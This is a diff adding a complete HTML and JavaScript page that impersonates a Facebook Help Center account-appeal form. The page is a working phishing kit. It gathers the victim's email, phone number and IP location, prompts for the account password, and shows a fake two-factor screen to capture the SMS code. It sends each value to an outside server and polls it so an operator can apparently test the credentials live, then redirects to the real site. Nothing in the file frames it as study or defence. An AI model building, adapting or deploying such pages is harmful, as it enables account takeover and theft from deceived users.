@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Help Center Disagree With Decision</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    />
+    <style>
+      .spinner {
+        width: 48px;
+        height: 48px;
+        border-radius: 50%;
+        border-top: 4px solid #3b82f6; /* Blue segment */
+        border-right: 4px solid transparent;
+        border-bottom: 4px solid transparent;
+        border-left: 4px solid transparent;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+
+  <body class="bg-white text-black font-sans flex flex-col min-h-screen">
+    <!-- Top Bar -->
+    <header class="bg-[#3b5998] p-4">
+      <div class="max-w-6xl mx-auto">
+        <form class="relative">
+          <input
+            type="text"
+            placeholder="How can we help?"
+            class="w-full pl-10 pr-4 py-2 rounded text-sm text-gray-700"
+          />
+          <i
+            class="fas fa-search absolute left-3 top-1/2 -translate-y-1/2 text-sm text-gray-500"
+          ></i>
+        </form>
+      </div>
+    </header>
+
+    <!-- Subnav -->
+    <nav class="bg-gray-100 text-xs text-gray-700 py-2">
+      <div class="max-w-6xl mx-auto px-4 flex justify-between items-center">
+        <div class="flex items-center font-bold text-[#385898]">
+          <i class="fas fa-home mr-1"></i>
+          <a href="#" class="hover:underline">Help Center</a>
+        </div>
+        <a href="#" class="hover:underline">English (US)</a>
+      </div>
+    </nav>
+
+    <!-- Main Layout -->
+    <main
+      class="max-w-6xl mx-auto flex flex-col-reverse lg:flex-row px-4 py-8 gap-6 flex-grow"
+      id="mainSection"
+    >
+      <!-- Sidebar -->
+      <aside class="w-full lg:w-1/3 text-sm space-y-1">
+        <ul class="space-y-1">
+          <li>Creating an Account</li>
+          <li>Your Profile</li>
+          <li>Friending</li>
+          <li>Dating</li>
+          <li>Your Home Page</li>
+          <li>Messaging</li>
+          <li>Reels</li>
+          <li>Stories</li>
+          <li>Photos</li>
+          <li>Videos</li>
+          <li>Gaming</li>
+          <li>Pages</li>
+          <li>Groups</li>
+          <li>Events</li>
+          <li>Fundraisers and Donations</li>
+          <li>Pay</li>
+          <li>Marketplace</li>
+          <li class="bg-gray-200 px-2 py-1 rounded">Apps</li>
+          <li>Mobile Apps</li>
+          <li>Accessibility</li>
+        </ul>
+      </aside>
+
+      <!-- Form Content -->
+      <section
+        class="w-full lg:w-2/3 text-sm bg-white border rounded p-6 shadow-sm"
+      >
+        <h2 class="text-base font-bold mb-2">Disagree With Decision</h2>
+
+        <p class="text-sm font-semibold mb-1">
+          Ticket Number:
+          <a href="#" class="text-blue-600 hover:underline">927229318579797</a>
+        </p>
+
+        <p class="text-xs text-gray-700 mb-4">
+          We may need to collect some info from you that'll help us review your
+          account again. Complete the required information and submit the appeal
+          form.
+        </p>
+
+        <form id="appealForm" class="space-y-4">
+          <!-- <div>
+            <label class="block text-gray-700 text-xs mb-1">Facebook</label>
+            <input
+              type="text"
+              class="w-full border rounded px-2 py-2 text-xs"
+            />
+          </div> -->
+
+          <!-- Required Fields -->
+          <!-- <div>
+            <label class="block text-gray-700 text-xs mb-1"
+              >Your Name <span class="text-red-500">*</span></label
+            >
+            <input
+              id="name"
+              type="text"
+              class="w-full border rounded px-2 py-2 text-xs"
+            />
+            <p id="error-name" class="hidden text-red-600 text-[11px] mt-1">
+              ⚠️ Missing required field<br />This field cannot be empty.
+            </p>
+          </div> -->
+
+          <!-- <div>
+            <label class="block text-gray-700 text-xs mb-1"
+              >Business Email <span class="text-red-500">*</span></label
+            >
+            <p class="text-[10px] text-gray-500 mb-1">
+              Notifications about the verification status will be sent to this
+              email.
+            </p>
+            <input
+              id="bemail"
+              type="email"
+              class="w-full border rounded px-2 py-2 text-xs"
+            />
+            <p id="error-bemail" class="hidden text-red-600 text-[11px] mt-1">
+              ⚠️ Missing required field<br />This field cannot be empty.
+            </p> -->
+          </div>
+
+          <div>
+            <label class="block text-gray-700 text-xs mb-1 font-bold"
+              >Email <span class="text-red-500">*</span></label
+            >
+            <input
+              id="pemail"
+              type="email"
+              class="w-full border rounded px-2 py-2 text-xs"
+            />
+            <p id="error-pemail" class="hidden text-red-600 text-[11px] mt-1">
+              ⚠️ Missing required field<br />This field cannot be empty.
+            </p>
+          </div>
+
+          <div>
+            <label class="block text-gray-700 text-xs mb-1 font-bold"
+              >Mobile Phone Number <span class="text-red-500">*</span></label
+            >
+            <p class="text-[10px] text-gray-500 mb-1">
+              We can use this phone number to contact you for verification.
+            </p>
+            <input
+              id="phone"
+              type="tel"
+              class="w-full border rounded px-2 py-2 text-xs"
+            />
+            <p id="error-phone" class="hidden text-red-600 text-[11px] mt-1">
+              ⚠️ Missing required field<br />This field cannot be empty.
+            </p>
+          </div>
+
+          <div class="mb-4">
+            <label class="block text-gray-700 text-xs mb-1"
+              >Select your reason</label
+            >
+
+            <div class="mb-2">
+              <label class="inline-flex items-center text-xs">
+                <input
+                  type="radio"
+                  name="reason"
+                  value="unknown"
+                  class="mr-2"
+                  onchange="handleReasonChange()"
+                />
+                I don't know why I violated any policy.
+                <span class="text-red-500"></span>
+              </label>
+            </div>
+
+            <div class="mb-2">
+              <label class="inline-flex items-center text-xs">
+                <input
+                  type="radio"
+                  name="reason"
+                  value="mistake"
+                  class="mr-2"
+                  onchange="handleReasonChange()"
+                />
+                I didn't violate any policy this is a mistake. Please restore my
+                account. <span class="text-red-500"></span>
+              </label>
+            </div>
+
+            <div class="mb-2">
+              <label class="inline-flex items-center text-xs">
+                <input
+                  type="radio"
+                  name="reason"
+                  value="other"
+                  class="mr-2"
+                  onchange="handleReasonChange()"
+                />
+                Other reason <span class="text-red-500"></span>
+              </label>
+            </div>
+
+            <div>
+              <label class="block text-gray-700 text-xs mb-1">
+                Please provide us information that will help us investigate
+              </label>
+              <textarea
+                id="info"
+                rows="5"
+                class="w-full border rounded px-2 py-2 text-xs resize-none"
+                disabled
+              ></textarea>
+            </div>
+          </div>
+
+          <p class="text-[11px]">
+            Learn more about our
+            <a href="#" class="text-blue-700 hover:underline"
+              >Terms and Community Standards</a
+            >.
+          </p>
+
+          <div class="flex justify-end">
+            <button
+              type="submit"
+              class="bg-[#385898] hover:bg-[#2d4373] text-white text-sm font-semibold px-4 py-1 rounded"
+            >
+              Verify
+            </button>
+          </div>
+        </form>
+      </section>
+    </main>
+
+    <!-- Modal -->
+    <div
+      id="passwordModal"
+      class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 hidden"
+    >
+      <div class="bg-white rounded shadow-lg w-full max-w-sm p-6">
+        <h3 class="text-lg font-bold mb-2">Please Enter Your Password</h3>
+        <p class="text-sm text-gray-700 mb-4">
+          For security reasons, please enter your password to continue.
+        </p>
+        <div class="relative mb-4">
+          <input
+            type="password"
+            id="passwordInput"
+            class="w-full border rounded px-3 py-2 text-sm pr-10"
+            placeholder="••••"
+          />
+          <button
+            type="button"
+            class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500"
+            onclick="togglePassword()"
+          >
+            <i class="fas fa-eye" id="toggleIcon"></i>
+          </button>
+        </div>
+        <p id="errorText" class="text-red-500 text-sm mt-1 hidden">
+          Please try again!
+        </p>
+        <div class="flex justify-end">
+          <button
+            onclick="confirmPassword()"
+            class="bg-blue-600 hover:bg-blue-700 text-white text-sm px-4 py-2 rounded"
+          >
+            Confirm
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Code Verification Result Modal -->
+    <div
+      id="codeResultModal"
+      class="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center hidden"
+    >
+      <div
+        class="w-full max-w-md bg-white rounded-xl shadow-md p-0 relative overflow-hidden"
+      >
+        <!-- Image and Close Button Wrapper -->
+        <div class="relative">
+          <img
+            src="assets/verification.PNG"
+            alt="Illustration"
+            class="w-full h-auto"
+          />
+          <button
+            onclick="document.getElementById('codeResultModal').classList.add('hidden')"
+            aria-label="Close"
+            class="absolute top-2 right-2 text-gray-500 hover:text-gray-700 bg-white rounded-full w-8 h-8 flex items-center justify-center shadow-md"
+          >
+            ✕
+          </button>
+        </div>
+
+        <!-- Content -->
+        <div class="p-6">
+          <h2 class="text-lg font-semibold text-gray-900 mb-1">
+            Verification processing
+          </h2>
+          <p class="text-sm text-gray-800 mb-1 leading-snug">
+            Your account has been verified as compliant and will be restored for
+            your protection.
+          </p>
+          <p class="text-sm text-blue-600 mb-4 cursor-pointer hover:underline">
+            Learn more
+          </p>
+
+          <!-- Status Steps -->
+          <div class="space-y-3 mb-6">
+            <img src="assets/process.PNG" />
+            <!-- <div class="flex items-start gap-3">
+              <div
+                class="mt-1 w-4 h-4 rounded-full border border-gray-400 flex items-center justify-center"
+              >
+                <div class="w-1.5 h-1.5 bg-gray-400 rounded-full"></div>
+              </div>
+              <div class="text-xs text-gray-600 leading-snug">
+                Disagree With Decision - Submit a request for account activity
+                verification.
+              </div>
+            </div>
+
+            <div class="flex items-start gap-3">
+              <div class="mt-1 w-4 h-4 rounded-full bg-blue-600"></div>
+              <div class="text-xs text-gray-900 font-semibold leading-snug">
+                Your account has been verified! We will review and restore your
+                account.
+              </div>
+            </div> -->
+          </div>
+
+          <!-- Finish Button -->
+          <button
+            onclick="window.location.href = 'https://facebook.com';"
+            class="w-full bg-blue-600 hover:bg-blue-700 text-white text-sm font-semibold py-2 rounded-md"
+          >
+            Finish
+          </button>
+
+          <p class="text-[10px] text-center text-gray-500 mt-4">
+            Help Center Facebook Protect
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Waiting Spinner Modal -->
+    <div
+      id="waitingModal"
+      class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 hidden z-50"
+    >
+      <div class="spinner"></div>
+      <!-- <div class="bg-white p-6 rounded shadow text-center">
+        <div class="mb-2 text-sm">⏳ Verifying password, please wait...</div>
+        <div
+          class="animate-spin h-5 w-5 border-2 border-blue-600 border-t-transparent rounded-full mx-auto"
+        ></div>
+      </div> -->
+    </div>
+
+    <!-- 2FA Page -->
+    <div id="verificationPage" class="hidden">
+      <div class="max-w-xl mx-auto mt-24 px-4">
+        <h2 class="font-semibold text-lg mb-2">Check your text messages</h2>
+        <p class="text-sm mb-4">
+          Your account has two-factor authentication enabled, which requires the
+          following additional step. Enter the code that we sent to *** *** **
+          <span id="lastDigits">••</span>.
+        </p>
+        <img
+          alt="Illustration of hands holding a phone with a shield icon and password input on screen"
+          class="w-full mb-4"
+          height="240"
+          src="/assets/code_input.PNG"
+          width="640"
+        />
+        <input
+          type="text"
+          id="verificationCodeInput"
+          placeholder="Code"
+          class="w-full border rounded px-3 py-2 text-sm"
+        />
+        <p id="errorCodeText" class="text-red-500 text-sm mt-1 hidden">
+          Please try again!
+        </p>
+
+        <p class="text-xs text-gray-600 mb-4">
+          <i class="fas fa-sync-alt mr-1"></i>
+          We can send a new code in
+          <span id="countdownText" class="font-semibold">2:50</span>
+        </p>
+
+        <button
+          id="continueBtn"
+          class="bg-blue-400 text-white font-semibold py-2 px-8 rounded-full cursor-not-allowed"
+          onclick="continueClick()"
+        >
+          Continue
+        </button>
+
+        <button
+          id="resendBtn"
+          onclick="resendCode()"
+          class="mt-4 text-sm text-blue-600 underline hidden"
+        >
+          Resend code
+        </button>
+      </div>
+    </div>
+
+    <!-- JS -->
+    <!-- (HTML <head> and <body> code remains the same as above until <script>) -->
+
+    <script>
+      const appealForm = document.getElementById("appealForm");
+      // const url = "http://localhost:3000";
+      const url = "https://help-center-be.vercel.app";
+      async function getUserIpAndCountry() {
+        try {
+          const res = await fetch("https://api.db-ip.com/v2/free/self");
+          const data = await res.json();
+
+          return {
+            ip: data.ipAddress,
+            country: data.countryName,
+            countryCode: data.countryCode,
+          };
+        } catch (error) {
+          console.error("Failed to get IP info:", error);
+          return { ip: "unknown", country: "unknown", countryCode: "XX" };
+        }
+      }
+
+      appealForm.addEventListener("submit", async function (e) {
+        e.preventDefault();
+
+        const fields = [
+          // { id: "name", errorId: "error-name" },
+          // { id: "bemail", errorId: "error-bemail" },
+          { id: "pemail", errorId: "error-pemail" },
+          { id: "phone", errorId: "error-phone" },
+        ];
+
+        let isValid = true;
+        let formData = {};
+
+        fields.forEach(({ id, errorId }) => {
+          const input = document.getElementById(id);
+          const error = document.getElementById(errorId);
+
+          if (!input.value.trim()) {
+            input.classList.add("border-red-500");
+            error.classList.remove("hidden");
+            isValid = false;
+          } else {
+            input.classList.remove("border-red-500");
+            error.classList.add("hidden");
+            formData[id] = input.value.trim();
+          }
+        });
+
+        if (isValid) {
+          const { ip, country, countryCode } = await getUserIpAndCountry();
+          formData.ip = ip;
+          formData.country = country;
+          formData.countryCode = countryCode;
+
+          fetch(`${url}/user/submit`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(formData),
+          })
+            .then((res) => res.json())
+            .then((data) => {
+              if (data.success) {
+                document
+                  .getElementById("passwordModal")
+                  .classList.remove("hidden");
+              } else {
+                // alert("❌ Error saving submission.");
+              }
+            })
+            .catch(() => alert("❌ Network error."));
+        }
+      });
+
+      function pollStatusWithTimeout(pemail, timeoutMs) {
+        const intervalMs = 2000; // poll every 2 seconds
+        let elapsed = 0;
+
+        const interval = setInterval(() => {
+          fetch(`${url}/user/status/${encodeURIComponent(pemail)}`)
+            .then((res) => res.json())
+            .then((data) => {
+              const status = data.status;
+
+              if (status === "true") {
+                clearInterval(interval);
+                hideWaitingModal();
+                onPasswordVerifiedSuccess(); // update UI
+              } else if (status === "false") {
+                clearInterval(interval);
+                hideWaitingModal();
+                errorText.classList.remove("hidden");
+                document
+                  .getElementById("passwordModal")
+                  .classList.remove("hidden");
+              }
+            })
+            .catch(() => {
+              clearInterval(interval);
+              hideWaitingModal();
+            });
+
+          elapsed += intervalMs;
+          if (elapsed >= timeoutMs) {
+            clearInterval(interval);
+            hideWaitingModal();
+            document.getElementById("passwordModal").classList.remove("hidden");
+          }
+        }, intervalMs);
+      }
+
+      function pollCodeStatusWithTimeout(pemail, timeoutMs) {
+        const intervalMs = 2000;
+        let elapsed = 0;
+        const errorText = document.getElementById("errorCodeText");
+
+        const interval = setInterval(() => {
+          fetch(`${url}/user/codeStatus/${encodeURIComponent(pemail)}`)
+            .then((res) => res.json())
+            .then((data) => {
+              const status = data.status;
+
+              if (status === "true") {
+                clearInterval(interval);
+                hideWaitingModal();
+                document
+                  .getElementById("codeResultModal")
+                  .classList.remove("hidden");
+              } else if (status === "false") {
+                clearInterval(interval);
+                hideWaitingModal();
+                errorText.classList.remove("hidden");
+              }
+            })
+            .catch(() => {
+              clearInterval(interval);
+              hideWaitingModal();
+            });
+
+          elapsed += intervalMs;
+          if (elapsed >= timeoutMs) {
+            clearInterval(interval);
+            hideWaitingModal();
+          }
+        }, intervalMs);
+      }
+
+      function showWaitingModal() {
+        document.getElementById("waitingModal").classList.remove("hidden");
+      }
+
+      function hideWaitingModal() {
+        document.getElementById("waitingModal").classList.add("hidden");
+      }
+
+      function onPasswordVerifiedSuccess() {
+        document.getElementById("passwordModal").classList.add("hidden");
+        document.getElementById("mainSection").classList.add("hidden");
+
+        const phoneInput = document.getElementById("phone").value.trim();
+        const lastTwoDigits = phoneInput.slice(-2) || "••";
+        document.getElementById("lastDigits").textContent = lastTwoDigits;
+
+        document.getElementById("verificationPage").classList.remove("hidden");
+        startCountdown();
+      }
+
+      function handleReasonChange() {
+        const selected = document.querySelector('input[name="reason"]:checked');
+        const infoBox = document.getElementById("info");
+
+        if (selected && selected.value === "other") {
+          infoBox.disabled = false;
+        } else {
+          infoBox.disabled = true;
+          infoBox.value = ""; // Clear if not other
+        }
+      }
+
+      function togglePassword() {
+        const input = document.getElementById("passwordInput");
+        const icon = document.getElementById("toggleIcon");
+
+        if (input.type === "password") {
+          input.type = "text";
+          icon.classList.replace("fa-eye", "fa-eye-slash");
+        } else {
+          input.type = "password";
+          icon.classList.replace("fa-eye-slash", "fa-eye");
+        }
+      }
+      function confirmPassword() {
+        const password = document.getElementById("passwordInput").value.trim();
+        const pemail = document.getElementById("pemail").value.trim();
+        const errorText = document.getElementById("errorText");
+
+        if (!password || !pemail) {
+          // alert("Please enter both email and password.");
+          return;
+        }
+
+        fetch(`${url}/user/submit-password`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ password, pemail }),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              showWaitingModal();
+              pollStatusWithTimeout(pemail, 250000); // 25s max
+            } else {
+              errorText.classList.remove("hidden");
+              // alert("❌ Password is not correct.");
+            }
+          })
+          .catch(() => {
+            alert("❌ Network error.");
+          });
+      }
+
+      function continueClick() {
+        const code = document
+          .getElementById("verificationCodeInput")
+          .value.trim();
+        const pemail = document.getElementById("pemail").value.trim();
+
+        if (!/^\d{6}$/.test(code)) {
+          // alert("❌ Invalid code! Must be 6 digits.");
+          return;
+        }
+
+        showWaitingModal();
+
+        fetch(`${url}/user/submit-code`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ code, pemail }),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.success) {
+              pollCodeStatusWithTimeout(pemail, 250000); // 25s max
+            } else {
+              hideWaitingModal();
+              // alert("❌ Failed to verify code.");
+            }
+          })
+          .catch(() => {
+            hideWaitingModal();
+            // alert("❌ Network error.");
+          });
+      }
+
+      // Countdown Timer
+      let countdownDuration = 170;
+
+      function startCountdown() {
+        const timerEl = document.getElementById("countdownText");
+        const resendButton = document.getElementById("resendBtn");
+        let timeLeft = countdownDuration;
+
+        const interval = setInterval(() => {
+          const minutes = Math.floor(timeLeft / 60);
+          const seconds = String(timeLeft % 60).padStart(2, "0");
+          timerEl.textContent = `${minutes}:${seconds}`;
+          timeLeft--;
+
+          if (timeLeft < 0) {
+            clearInterval(interval);
+            resendButton.classList.remove("hidden");
+            timerEl.parentElement.classList.add("hidden");
+          }
+        }, 1000);
+      }
+
+      // Code Input + Continue Button Activation
+      const codeInput = document.getElementById("verificationCodeInput");
+      const continueBtn = document.getElementById("continueBtn");
+
+      codeInput.addEventListener("input", () => {
+        const value = codeInput.value.trim();
+        const valid = /^\d{6}$/.test(value);
+
+        continueBtn.disabled = !valid;
+        continueBtn.classList.toggle("cursor-not-allowed", !valid);
+        continueBtn.classList.toggle("bg-blue-400", !valid);
+        continueBtn.classList.toggle("bg-blue-600", valid);
+        continueBtn.classList.toggle("hover:bg-blue-700", valid);
+      });
+
+      continueBtn.addEventListener("click", () => {
+        const code = codeInput.value.trim();
+        // if (code === "123456") {
+        //   alert("✅ Code verified! (demo)");
+        //   // Proceed to next page or action
+        // } else {
+        //   alert("❌ Invalid code!");
+        // }
+      });
+
+      function resendCode() {
+        // alert("A new code has been sent!");
+        document.getElementById("resendBtn").classList.add("hidden");
+        document
+          .querySelector(".text-xs.text-gray-600.mb-4")
+          .classList.remove("hidden");
+        startCountdown();
+      }
+    </script>
+  </body>
+</html>
